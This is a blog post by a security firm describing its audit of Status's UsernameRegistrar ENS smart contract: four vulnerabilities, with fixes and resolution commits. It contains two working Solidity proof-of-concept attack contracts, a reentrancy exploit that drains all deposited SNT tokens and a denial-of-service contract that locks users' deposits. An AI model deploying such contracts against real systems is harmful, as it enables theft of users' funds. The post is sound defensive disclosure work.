Close

Menu

  * [About Us](https://blog.sigmaprime.io/pages/about-us.html)

[![Blog Logo](./imgs/blog/sigp-logo-black.png)](https://blog.sigmaprime.io/)
__Menu

# Status ENS Integration: Smart Contract Security Review

[Dr Adrian Manning](https://blog.sigmaprime.io/author/dr-adrian-manning.html)
and  [Mehdi Zerouali](https://blog.sigmaprime.io/author/mehdi-zerouali.html) |
Wed 24 October 2018 Updated on Wed 24 October 2018 Estimated read time: 11 min

_Sigma Prime was commercially engaged by Status to perform a time-boxed
security review of the UsernameRegistrar smart contract, which supports the
Ethereum Name Service (ENS) registrar developed by Status. This post details
four vulnerabilities identified in the course of this asssessment. The full
security assessment report for this engagement and the supporting test suite
are available on our[GitHub repository](https://github.com/sigp/public-
audits/tree/master/status)._

# Introduction

[Status](https://status.im) is a prominent member of the Ethereum ecosystem
who is actively developing a mobile application that acts as a secure
messaging client, DApp browser and Ethereum wallet. Just like Sigma Prime,
Status is also actively involved in developing the next generation of Ethereum
by building their nim client, [Nimbus](https://github.com/status-im/nimbus).
This post details a review that was recently conducted for the Status
messenger client, which focused on the username registration which occurs on-
chain.

The `UsernameRegistrar` contract is designed to register and maintain a record
of Status usernames by leveraging the existing [ENS
infrastructure](https://ens.domains/). The contract serves multiple purposes,
including the following:

  * Enabling users to register ownership of an Ethereum name that is a subdomain of _stateofus.eth_ , by depositing a pre-defined amount of SNT tokens;
  * Allowing the owner of a name to relinquish ownership and recall their deposit, after a specified `releaseDelay` period, thus returning the name to the marketplace;
  * Providing functionality to activate and deactivate the registry;
  * Allowing the contract controller to withdraw non-deposit tokens (presumably sent to the contract by accident);
  * Providing migration functionality that is deployed when the registry is transferred to a newRegistry;
  * Implementing a set of slashing conditions such that users who violate the conditions may be penalized (and lose their deposited tokens) while individuals that identify offences are rewarded;
  * Providing a suite of getter functions allowing users to access various information about the registry or a specific account (ex: obtain the address associated with a specific username).

# Executive Summary

In September 2018, Status commercially engaged Sigma Prime to perform a
security review of the `UsernameRegistrar` smart contract. The review focused
on security aspects of the Solidity implementation of the smart contract,
though general recommendations and informational comments related to code
quality were also provided.

This review was initially conducted on commit
[eaefa92](https://github.com/status-im/ens-
usernames/commit/eaefa92a258c784f1df4066e057e8170bcb6ef95), exclusively
targeting the `UsernameRegistrar` smart contract (all other contracts were
considered out-of-scope). Retesting activities targeted the commit
[30ce35c](https://github.com/status-im/ens-
usernames/commit/30ce35c7efe0079d8df286826d4f826f102c818e), which contains the
code modifications and correction resulting from the initial report.

The testing team identified a total of nine (9) issues during this assessment,
of which:

  * Three (3) are classified as medium risks;
  * One (1) is classified as low risk;
  * Five (5) are classified as informational.

**All these issues have been addressed by the Status development team.**

# Detailed Findings

This section provides a detailed description of four vulnerabilities
identified within the `UsernameRegistrar` smart contract. Each vulnerability
has a severity classification which is determined by its likelihood and
impact. Please refer to our [full report](https://github.com/sigp/public-
audits/tree/master/status) for more information.

## Re-entrancy Vulnerability Allows Controller To Steal All Deposited SNT
Tokens (Medium Severity)

The `controller` of the `UsernameRegistrar` contract can withdraw all users’
tokens from the contract by exploiting a re-entrancy vulnerability.

The vulnerability affects the `release()` function on lines
[142](https://github.com/status-im/ens-
usernames/blob/eaefa92a258c784f1df4066e057e8170bcb6ef95/contracts/registry/UsernameRegistrar.sol#L142)
to [153](https://github.com/status-im/ens-
usernames/blob/eaefa92a258c784f1df4066e057e8170bcb6ef95/contracts/registry/UsernameRegistrar.sol#L153)
(lines [26] - [37] below):

    
    
       /**
         * @notice Release username and retrieve locked fee, needs to be called
         * after `releasePeriod` from creation time by ENS registry owner of domain
         * or anytime by account owner when domain migrated to a new registry.
         * @param _label Username hash.
         */
        function release(
            bytes32 _label
        )
            external
        {
            bytes32 namehash = keccak256(abi.encodePacked(ensNode, _label));
            Account memory account = accounts[_label];
            require(account.creationTime > 0, "Username not registered.");
            if (state == RegistrarState.Active) {
                require(msg.sender == ensRegistry.owner(namehash), "Not owner of ENS node.");
                require(block.timestamp > account.creationTime + releaseDelay, "Release period not reached.");
                ensRegistry.setSubnodeOwner(ensNode, _label, address(this));
                ensRegistry.setResolver(namehash, address(0));
                ensRegistry.setOwner(namehash, address(0));
            } else {
                require(msg.sender == account.owner, "Not the former account owner.");
                address newOwner = ensRegistry.owner(ensNode);
                //Low level call, case dropUsername not implemented or failing, proceed release.
                //Invert (!) to supress warning, return of this call have no use.
                !newOwner.call(
                    abi.encodeWithSignature(
                        "dropUsername(bytes32)",
                        _label
                    )
                );
            }
            delete accounts[_label];
            if (account.balance > 0) {
                reserveAmount -= account.balance;
                require(token.transfer(msg.sender, account.balance), "Transfer failed");
            }
            emit UsernameOwner(_label, address(0));
    }
    

Consider the scenario that 100 SNT tokens have been deposited by users through
the standard registration process. Let us also assume the contract has set a
price of 10 , without loss of generality.

A malicious controller could create an attacking contract similar to the one
provided below, and call the `moveRegistry()` function with this contract’s
address as the parameter. The attacking contract would implement a malicious
version of `dropUsername(bytes32)` which can re-enter the release function a
set number of times. This contract would need to be pre-loaded with tokens and
would need to have registered a name in the `UsernameRegistrar` contract.

ReentrancyAttack.sol:

    
    
    pragma solidity ^0.4.24;
    
    // Set up an interface to UsernameRegistry to avoid import and keep this
    // contract self-contained
    
    interface UsernameRegistrar {
      function release (bytes32) external;
      function register (bytes32, address, bytes32, bytes32) external returns (bytes32);
      function price() external returns (uint);
    }
    
    // Similarly the ERC20 Token we are stealing
    interface ERC20Token {
      function transfer(address _to, uint _value) external returns (bool);
      function approve(address _spender, uint _value) external returns (bool);
      function balanceOf(address) external view returns (uint);
    }
    
    contract ReentrancyAttack {
    
      UsernameRegistrar public usernameRegistrar;
      ERC20Token public token;
      // set an owner so someone else can't also use this attack
      address public owner;
      address public beneficiary; // the address to get all the stolen tokens
      bytes32 public registeredName; //for convenience
      uint public timesToReenter;
    
      constructor(
        UsernameRegistrar _unr,
        ERC20Token _token,
        address _beneficiary) public
      {
        usernameRegistrar = _unr;
        token = _token;
        beneficiary = _beneficiary;
        owner = msg.sender;
      }
    
      // this could be called in the constructor, but it's easier to run separately
      // once tokens have been sent here.
      function registerName(bytes32 name) public {
        require(msg.sender == owner); // prevent others from attacking
        registeredName = name;
        // approve tokens for  UsernameRegistrar
        token.approve(usernameRegistrar, usernameRegistrar.price());
        // register the name
        usernameRegistrar.register(name, 0x0, 0x0, 0x0);
      }
    
       // Once the registrar has been set to "this", we can steal all the tokens
       function stealAllTheTokens() public {
         require(msg.sender == owner); // prevent others from attacking
         require(registeredName != 0x0);
         // calculate the total balance and divide by price to determine
         // number of required re-entrancys'
         uint contract_balance = token.balanceOf(usernameRegistrar);
         uint price = usernameRegistrar.price();
    
         // revert if price=0 (controller can set it anyway)
         timesToReenter = contract_balance/price -1;
         // Re-enter a number of times.
         usernameRegistrar.release(registeredName);
    
         // all rentrancy done. Withdraw all the money
         // get our current balance of stolen funds
         uint balance = token.balanceOf(this);
         // transfer all our stolen money to beneficiary
         token.transfer(beneficiary, balance);
       }
    
      function dropUsername(bytes32 _nothing) public {
        if (timesToReenter > 0) {
           timesToReenter -= 1;
           usernameRegistrar.release(registeredName);
          }
        _nothing; //suppress warning
      }
    
      function () public {
        //do nothing. Required for moveRegistry()
      }
    }
    

In this exploitation example, once the `moveRegistry()` function has been
called, the controller would call the `stealAllTheTokens()` function on the
attacking contract. This would re-enter the `release()` function 10 times (as
each time it will withdraw price = 10 tokens, thus withdrawing the full
balance of 100 tokens in the contract).

The attacking contract would execute the call on line
[142](https://github.com/status-im/ens-
usernames/blob/eaefa92a258c784f1df4066e057e8170bcb6ef95/contracts/registry/UsernameRegistrar.sol#L142)
([26] above) of `UsernameRegistrar.sol` which would re-enter `release()` 10
more times before completing. Once completed, lines
[149](https://github.com/status-im/ens-
usernames/blob/eaefa92a258c784f1df4066e057e8170bcb6ef95/contracts/registry/UsernameRegistrar.sol#L149)
\- [154](https://github.com/status-im/ens-
usernames/blob/eaefa92a258c784f1df4066e057e8170bcb6ef95/contracts/registry/UsernameRegistrar.sol#L154)
([33] - [38] above) would be executed 10 times, withdrawing 100 tokens to the
attacking contract.

### Recommendation

We recommend following the [Checks-Effects-Interactions
pattern](https://solidity.readthedocs.io/en/latest/security-
considerations.html#use-the-checks-effects-interactions-pattern) whereby
external calls are placed after all state changes in the function. In this
particular example, moving the external call on line
[142](https://github.com/status-im/ens-
usernames/blob/eaefa92a258c784f1df4066e057e8170bcb6ef95/contracts/registry/UsernameRegistrar.sol#L142)
after the state changes to line [154](https://github.com/status-im/ens-
usernames/blob/eaefa92a258c784f1df4066e057e8170bcb6ef95/contracts/registry/UsernameRegistrar.sol#L154)
(with it’s own `if` statement to check for `!RegistrarState.Active` ) provides
one solution.

### Resolution

The smart contract was updated in commit [fbd0e3a](https://github.com/status-
im/ens-usernames/commit/fbd0e3a9a20742ae81b7315c144c818a1e2cda95) to follow
the _Checks-Effects-Interactions_ pattern which mitigates the re-entrancy
vulnerability.

## Controller Can Indefinitely Lock Users’ Tokens (Medium Severity)

The `release()` function is affected by a denial of service (DoS)
vulnerability, which allows the controller (or an attacker who owns the
controller account) to permanently prevent users from withdrawing their
deposited tokens.

This vulnerability relates to the way the external call on line
[143](https://github.com/status-im/ens-
usernames/blob/eaefa92a258c784f1df4066e057e8170bcb6ef95/contracts/registry/UsernameRegistrar.sol#L143)
is executed. A malicious controller can create an attack contract, which
implements a false assert (as shown in the example attack contract below) that
consumes all the gas of the called transaction, causing the global transaction
to fail. To execute this attack the controller would migrate the
`UsernameRegistrar` contract to the malicious contract, preventing all users
from withdrawing their tokens.

DOSAttack.sol:

    
    
    pragma solidity ^0.4.24;
    
    contract DOSAttack {
    
      function dropUsername(bytes32 _nothing) public {
        assert(1==2);  // consume all gas
        _nothing; // supress warning
    }
    
      function () public {
        //do nothing. Required for moveRegistry()
      }
    }
    

_Note: In practice, gas allowance of the CALL opcode varies and is dependent
on the total transaction gas allowance. For transactions with > 3.5M gas, the
residue gas after the call is sufficient to complete the release() function._

### Recommendation

This type of vulnerability can be prevented by specifying a gas stipend to the
external call, which prevents the external call from consuming the entire gas
of the transaction. Such a solution will limit the functionality of
`dropUsername(bytes32)` to the stipend gas specified in the call. An example
of the correct syntax is:

    
    
    !newOwner.call.gas(gasAmount)(
        abi.encodeWithSignature(
            "dropUsername(bytes32)",
            _label
        )
    );
    

### Resolution

The commit [a1fe1f0](https://github.com/status-im/ens-
usernames/commit/a1fe1f02e7e0d8f19871f9a9dedbf3bd4cce3a4b) adds a gas stipend
to the external call function, preventing the call from consuming all the gas
in the transaction.

## Users Can Create Unslashable/Non-removeable Subnode Names (Medium Severity)

Users can register any name (including unsavoury ones) as a sub-subnode of the
`ENSNode` ( _stateofus_ ). These names are irrevocable and can be obtained for
free, regardless of the `price` variable.

The vulnerability exists because there is no functionality in the
UsernameRegistrar contract to revoke or deal with subnodes beyond the first
level. As such, a malicious user could register a name such as _“SigmaPrime”_
, which is invalid because it includes capitals. Once registered, the user may
call `setSubnodeOwner()` on the ensRegistry contract and create a subnode name
of their choosing without restriction (for example, lets use “OwnedSubnode”).
The user may then call `slashInvalidUsername()` in order to have their deposit
returned, whilst maintaining ownership of the sub-subdomain. If, for example,
ENSNode is set to _stateofus_ (assumed to be a subnode of the Ethereum ENS
registry), the malicious user would retain ownership of the name
`OwnedSubnode.SigmaPrime.stateofus.eth`.

In this process, the user has obtained this domain for free and the name is
irrevocable and unslashable. Although this vulnerability may not affect the
front-end application dealing with usernames, it allows malicious users to
create names derived from `stateofus.eth` which could potentially damage
Status’ reputation.

### Recommendation

As ENS names are recursive (an arbitrary amount of sub-domains can be
created), it would be possible to implement a sub-domain slashing function.
This function would not be dissimilar to the functionality implemented in
slashing reserved names using a merkle proof. A user could slash any subdomain
by providing a list of labels which recursively hash to an owned namehash. The
contract could then reset the owner and slash any funds in the originating
sub-domain.

### Resolution

A new function `eraseNode()` was introduced in commit
[51a7010](https://github.com/status-im/ens-
usernames/commit/51a701046998262ea80f7bfe21a7be2b4ec5f08c) to allow a number
of iterations of subnodes to be removed if the root subdomain is invalid.
Owners of a valid subdomain are free to generate arbitrary levels of
subdomains beyond their valid root subdomain.

## Slashing Process Vulnerable to Front-Running (Low Severity)

Front-running attacks [5, 6] involve users watching the blockchain for
particular transactions and, upon observing such a transaction, submitting
their own transactions with a greater gas price. This incentivises miners to
prioritise the later transaction.

`UsernameRegistrar.sol` is vulnerable to front-running. The contract contains
the slashing functions `slashSmallUsername()`, `slashAddressLikeUsername()`,
`slashReservedUsername()`, and `slashInvalidUsername()`. These functions may
be called externally by an individual who notices that a given `_username` is
not valid. For example, the external caller may notice that `_username`
appears on the list of reserved usernames and call `slashReservedUsername()`.
Each of the slashing functions calls the `internal` function
`slashUsername()`, which slashes tokens from the account corresponding to
`_username` and distributes them to the external caller who identified the
violation. Thus, individuals are incentivised to report invalid usernames.

The slashing procedure is vulnerable to front-running. An individual may watch
the blockchain for calls to the slashing functions and read the data submitted
in a call. After verifying the validity of the data, an individual may submit
a competing transaction with a higher gas price to claim the bounty for
themselves.

This vulnerability may affect the game-theoretic incentives which prevent
users from registering invalid usernames and can potentially affect the
dynamics of username registration.

### Recommendation

There are a number of [known techniques](https://blog.sigmaprime.io/solidity-
security.html#race-conditions) used to address front running vulnerabilities.
One method consists in placing an upper bound on the allowed gas price for
functions vulnerable to front-running (in this case, the slashing functions).
Note that this approach has the drawback of potentially restricting access to
the slashing functions in periods of heavy network usage (i.e. when high gas
prices are required to promptly execute transactions).

A [commit-reveal](https://karl.tech/learning-solidity-part-2-voting/) scheme
can also be implemented to mitigate this vulnerability. An example would be
for users to send a transaction which contains a hash of the username they
want to slash, salted with a beneficiary address. In a second transaction,
they would reveal the beneficiary address and the username to slash. The
salted address is required to prevent front-running of the commit-and-reveal
transactions themselves.

Finally, a more advanced technique known as [Submarine
Transactions](http://hackingdistributed.com/2017/08/28/submarine-sends/) may
be relevant. However, an efficient implementation requires the CREATE2 opcode,
not yet implemented in Ethereum.

### Resolution

A commit-reveal scheme has been implemented in commit
[1855141](https://github.com/status-im/ens-
usernames/commit/18551416beffa7fee183c638710a6daba32dfa80) to mitigate the
front-running vulnerability.

# Conclusion

This review focused solely on the username registration contract whereby users
deposit SNT tokens in order to acquire a username on the Status platform. This
is implemented by leveraging the Ethereum Name Service (ENS) infrastructure.
Status' `UsernameRegistrar` contract will be the main contract holding the SNT
tokens and managing subdomains registrations corresponding to usernames on the
Status platform. The contract was well written, and all vulnerabilities
identified during this assessment were acknowledged and addressed by the
development team.

We've had a lot of pleasure working with Status, and are looking forward to
being involved in future projects to help secure our decentralised future.

[ __Twitter ](https://twitter.com/share?text=Status ENS Integration: Smart
Contract Security Review&url=https://blog.sigmaprime.io/status-ens-
review.html) [ __Facebook
](https://www.facebook.com/sharer/sharer.php?u=https://blog.sigmaprime.io/status-
ens-review.html) [ __Google+
](https://plus.google.com/share?url=https://blog.sigmaprime.io/status-ens-
review.html)

[ethereum](https://blog.sigmaprime.io/tag/ethereum.html)[blockchain](https://blog.sigmaprime.io/tag/blockchain.html)[cybersecurity](https://blog.sigmaprime.io/tag/cybersecurity.html)[smart
contract audit](https://blog.sigmaprime.io/tag/smart-contract-
audit.html)[solidity security review](https://blog.sigmaprime.io/tag/solidity-
security-review.html)

![Dr Adrian Manning](https://blog.sigmaprime.io/imgs/authors/age.jpg)

#### [Dr Adrian Manning](https://blog.sigmaprime.io/author/dr-adrian-
manning.html)

Physicist turned blockchain scientist. An avid fan of the Ethereum community
and the projects being built in the space.

__Sydney, Australia

![Mehdi Zerouali](https://blog.sigmaprime.io/imgs/authors/mz.jpg)

#### [Mehdi Zerouali](https://blog.sigmaprime.io/author/mehdi-zerouali.html)

Mehdi is a co-founder and a director of Sigma Prime. He is a penetration
tester particularly interested in decentralised systems, with a strong focus
on the Ethereum platform.

__Sydney, Australia

